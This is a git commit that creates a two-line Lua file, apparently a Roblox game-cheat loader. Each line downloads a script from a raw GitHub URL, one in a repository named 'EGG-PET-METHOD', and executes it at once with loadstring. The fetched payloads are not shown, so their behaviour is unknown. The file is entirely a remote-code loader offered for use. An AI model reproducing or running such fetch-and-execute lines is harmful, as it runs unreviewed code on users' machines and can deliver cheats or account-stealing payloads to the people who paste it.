1e6a201e84c2887bba41da85ce9491096e937c53
muzammil909900 <143308858+muzammil909900@users.noreply.github.com>
2025-06-29 20:37:11 +0500

    Create GaG.lua

---
+++ GaG.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/e000dcbd121c14d805b7c7689d79e8cd.txt"))()
